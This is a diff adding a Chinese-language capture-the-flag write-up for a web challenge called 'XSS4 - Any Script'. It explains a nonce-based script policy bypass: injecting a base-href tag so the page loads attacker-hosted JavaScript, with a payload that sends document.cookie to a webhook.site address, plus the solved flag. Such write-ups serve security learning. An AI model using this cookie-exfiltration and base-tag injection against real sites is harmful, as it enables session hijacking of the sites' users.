@@ -116,11 +116,42 @@
 
 ---
 
+# XSS4
 
-
+## 題目
+長得跟 [[#題目|XSS1]] 差不多，但大標變為 `XSS4 - Any Script`
+![[W6-4_web.png|313]]
+點 "Submit Script" -> 進入 Note Content 頁面
+![[W6-4_note.png|212]]
 ```js
-<base href="https://cdn.jsdelivr.net/gh/<GitHub帳號>/<Repository>@<Branch>/<檔案路徑>">
-
-<base href="https://cdn.jsdelivr.net/gh/AnHsiL/ESU-CTF-2026@main/">
-
+<body>
+	<h1>Note Content</h1>
+	aaa
+	<p id="timeDisplay"></p>
+	<button id="showTimeButton" class="btn">更新時間</a>
+	<script src="/static/script.js" nonce="NDkxNzQ3" defer></script>
+</body>
 ```
+
+## 解題
+1. 觀察 Note Content 頁面，發現有使用 nonce -> 只會允許帶有「在後端產生隨機的字串」標籤的 script -> 用公開的 CDN 上傳惡意套件讓網頁載入
+2. 寫惡意套件 `static/script.js` 並上傳到公開的 github repository
+   ```js
+   fetch("https://webhook.site/[webhook網址]?aaa="+btoa(document.cookie))
+   ```
+   ```text
+   [repository名稱]/
+    |
+    └── static/
+        └── script.js
+   ```
+3. 用公開的 CDN，這邊使用 Cloudflare Pages，登入後進入 Workers & Pages，選擇 `Create application` → Continue with Pages → `Connect to Git`，連接 GitHub，選擇公開的 github repository，按 `Save and Deploy`
+   完成後會得到一個分配的網址 `https://[...].pages.dev`
+4. 回 CTF 題目的 Any Script 頁面，用 `<base herf="[分配的網址]">` 改變所有相對路徑的 base URL，當程式呼叫 `"./static/script.js"` 時會改為呼叫 `[分配的網址]/static/script.js`，輸入區輸入
+   ```js
+   <base href="[分配的網址]">
+   ```
+5. 到 Report to admin 輸入 Note Content 網址，並到 webhook 找
+   ![[W6-4_aaa.png]]
+6. base64 decode -> flag=`CTF{xss4_362e28d7809958cf8f227388}`
+   
